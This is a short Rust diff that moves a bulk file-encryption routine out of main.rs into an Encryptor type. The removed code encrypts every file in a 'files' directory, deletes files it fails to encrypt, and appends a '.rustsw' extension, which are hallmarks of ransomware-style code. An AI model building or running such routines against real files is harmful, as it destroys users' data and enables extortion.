@@ -9,8 +9,6 @@ use rand_hc::Hc128Rng;
 use std::fs;
 use std::path;
 
-const ENCRYPTED_EXTENSION: &str = ".rustsw";
-
 fn main() {
     let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
 
@@ -19,30 +17,8 @@ fn main() {
 
     let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);
 
-    encrypt_dir(&String::from("files"), &encryptor);
+    encryptor.encrypt_dir(&String::from("files"));
     //encrypt_files_in_dir(files, encryptor);
-}
-
-fn encrypt_dir(dir: &String, encryptor: &encryptor::Encryptor) -> bool {
-    let files = match fs_extra::dir::get_dir_content(&dir) {
-        Ok(content) => content.files,
-        Err(_) => return false,
-    };
-
-    encrypt_files(&files, encryptor);
-    true
-}
-
-fn encrypt_files(files: &Vec<String>, encryptor: &encryptor::Encryptor) {
-    for file in files {
-        println!("Name: {}", &file);
-        encryptor.encrypt_file_else_delete(&file);
-
-        match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
-            Ok(_) => (),
-            Err(_) => (),
-        };
-    }
 }
 
 /*
